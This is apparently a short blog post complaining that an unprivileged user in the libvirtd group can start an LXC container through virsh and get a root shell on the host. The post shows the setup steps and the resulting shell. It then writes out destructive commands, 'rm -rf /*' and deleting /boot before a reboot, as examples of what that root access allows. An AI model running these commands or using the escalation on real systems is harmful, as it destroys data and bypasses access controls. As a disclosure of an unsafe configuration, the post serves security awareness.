---
layout: post
title: Docker Container Madness
---

Preamble:
{% highlight bash %}
  # apt-get install docker virt-manager
  # export LIBVIRT_DEFAULT_URI=lxc:///{% endhighlight %}

Create an unprivileged user:
```
  # useradd -G libvirtd user 
```
Save the following domXML template
```
  <domain type='lxc'>
	  <name>container</name>
	  <memory>102400</memory>
	  <os>
		  <type>exe</type>
		  <init>/bin/sh</init>
	  </os>
	  <devices>
		  <console type='pty'/>
	  </devices>
  </domain>
```
Import container into Libvirt:
```
  user@host:~$ virsh define container.xml
```
Start the container:
```
  user@host:~$ virsh start test
  user@host:~$ virsh console test
```
And now run bash shell:
```
  Connected to domain test
  Escape character is ^]
  
  # bash
  bash: groups: command not found
  /bin/lesspipe: 1: /bin/lesspipe: basename: not found
  /bin/lesspipe: 1: /bin/lesspipe: dirname: not found
  /bin/lesspipe: 295: [: =: unexpected operator
  Command 'dircolors' is available in '/usr/bin/dircolors'
  The command could not be located because '/usr/bin' is not included in the PATH environment variable.
  dircolors: command not found
  root@host:/# 
```
Huh? You now have root. What kind of messed up world is this? I can read/write to any file:

```
  root@host:/# rm -rf /*
```

Or alternatively have a bit of fun
```
  root@host:/# rm /boot/*; reboot;
```

Is it possible to be careful with Docker? It doesn't seem safe for mortals.
```
# docker version

Client version: 1.0.1
Client API version: 1.12
Go version (client): go1.2.1
Git commit (client): 990021a
Server version: 1.0.1
Server API version: 1.12
Go version (server): go1.2.1
Git commit (server): 990021a
```
